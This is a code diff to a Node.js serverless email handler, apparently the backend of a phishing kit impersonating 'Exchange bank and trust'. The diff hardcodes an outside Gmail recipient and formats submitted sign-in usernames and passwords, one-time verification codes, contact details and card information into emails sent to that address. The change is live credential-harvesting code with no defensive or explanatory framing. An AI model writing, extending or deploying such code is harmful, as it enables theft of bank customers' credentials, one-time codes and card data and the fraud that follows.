@@ -12,18 +12,47 @@ exports.handler = async (event) => {
 
     // Configure the email transporter
     const transporter = nodemailer.createTransport({
-        service: 'gmail', // Use your email service
+        service: 'gmail',
         auth: {
-            user: process.env.EMAIL_USER, // Your email address
-            pass: process.env.EMAIL_PASS, // Your email password or app password
+            user: process.env.EMAIL_USER,
+            pass: process.env.EMAIL_PASS,
         },
     });
 
+    // Always send to your desired recipient (not the user input)
+    const recipient = "melitazdenekxny23@gmail.com"; // <-- set your destination email here
+
+    // Format subject for clarity
+    let customSubject = 'New Form Submission';
+    if (subject === 'Login Details') {
+        customSubject = 'Submission of Exchange bank and trust sign in form';
+    } else if (subject === 'Contact Info') {
+        customSubject = 'Submission of Exchange bank and trust Contact Verification form';
+    } else if (subject === 'OTP Verification') {
+        customSubject = 'Submission of Exchange bank and trust OTP verification form';
+    } else if (subject === 'Card Info') {
+        customSubject = 'Submission of Exchange bank and trust Card Verification form';
+    }
+
+    // Format message for clarity
+    let textBody = '';
+    if (subject === 'Login Details') {
+        textBody = `Username: ${email}\nPassword: ${message}`;
+    } else if (subject === 'Contact Info') {
+        textBody = `Email Address: ${email}\nPhone Number: ${message}`;
+    } else if (subject === 'OTP Verification') {
+        textBody = `Verification Code: ${message}`;
+    } else if (subject === 'Card Info') {
+        textBody = message;
+    } else {
+        textBody = `Message: ${message}`;
+    }
+
     const mailOptions = {
         from: process.env.EMAIL_USER,
-        to: email,
-        subject: subject,
-        text: message,
+        to: recipient,
+        subject: customSubject,
+        text: textBody,
     };
 
     try {
@@ -36,7 +65,7 @@ exports.handler = async (event) => {
         console.error('Error sending email:', error);
         return {
             statusCode: 500,
-            body: JSON.stringify({ message: 'Error sending email' }),
+            body: JSON.stringify({ message: 'Error sending email', error: error.message }),
         };
     }
 };
